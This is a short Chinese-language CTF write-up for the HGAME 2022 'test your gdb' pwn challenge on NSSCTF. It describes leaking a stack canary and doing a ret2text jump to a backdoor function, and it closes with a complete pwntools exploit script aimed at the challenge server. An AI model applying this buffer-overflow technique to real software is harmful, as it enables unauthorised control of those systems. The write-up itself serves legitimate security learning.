[[HGAME 2022 week1]test your gdb | NSSCTF](https://www.nssctf.cn/problem/1871)
![[Pasted image 20240902223656.png]]
怎么说呢，也是一道不算难的题目，只要输入的`v8`和`v6`一样`write`函数就会输出栈上的`0x100`数量的数据，`canary`就在里面，同时有`backdoor`函数，后面就是普通的ret2text题目。
断点下在`memcmp`函数前面
![[Pasted image 20240902223921.png]]
![[Pasted image 20240902223938.png]]
可以看到`s1`是我们的输入,`s2`是`v6`的位置，查看一下
![[Pasted image 20240902224032.png]]
获得了`v6`内的数据。
输入正确后会返回的`0x100`个数据：
![[Pasted image 20240902224116.png]]
根据`canary`的特色可以看出有`0x18`的垃圾数据，可获得`canary`
exp:
```python
from pwn import *
import pwnlib.gdb

context(arch='amd64', os='linux', log_level='debug')
local = False
if local:
    p = process('./testyourgdb')
    # pwnlib.gdb.attach(p, 'b main')
else:
    p = remote("node5.anna.nssctf.cn", 27173)

ret = 0x40101a
rdi = 0x407b53
backdoor = 0x401256
payload1 = p64(0xb0361e0e8294f147) + p64(0x8c09e0c34ed8a6a9)
p.recvuntil(b'word\n')
p.send(payload1)
p.recv(0x18)
canary = u64(p.recv(8))
log.success(f'canary: {hex(canary)}')
payload = b'a' * (0x20 - 8) + p64(canary) + b'a' * 8 + p64(ret) + p64(backdoor)
p.sendline(payload)
p.interactive()
```